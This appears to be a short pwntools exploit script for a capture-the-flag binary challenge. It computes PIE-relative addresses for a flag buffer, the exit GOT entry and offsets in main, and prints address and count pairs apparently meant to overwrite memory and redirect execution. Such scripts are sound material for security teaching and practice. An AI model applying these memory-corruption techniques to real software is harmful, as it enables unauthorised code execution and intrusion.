from pwn import  *


pie_base = 0x563c6a7e4000


target = pie_base + 0x00000000000020D5 # Somehow you got here??

buf = hex(target).encode() + b' ' + b'24'

flag = pie_base + 0x00000000000050A0

buf = hex(flag-2).encode() + b' ' + b'10'

print(buf.decode())

exit_got = pie_base + 0x4050

buf = hex(exit_got).encode() + b' ' + b'1'
print(buf.decode())

main_593 = pie_base + 0x143a

buf = hex(main_593+1).encode() +b' ' + b'1'

print(buf.decode())

buf = hex(flag-3).encode() + b' ' + b'5'
print(buf.decode())
buf = hex(main_593+2).encode() + b' ' + b'1'

print(buf.decode())
buf = hex(main_593+5).encode() + b' ' + b'1'

print(buf.decode())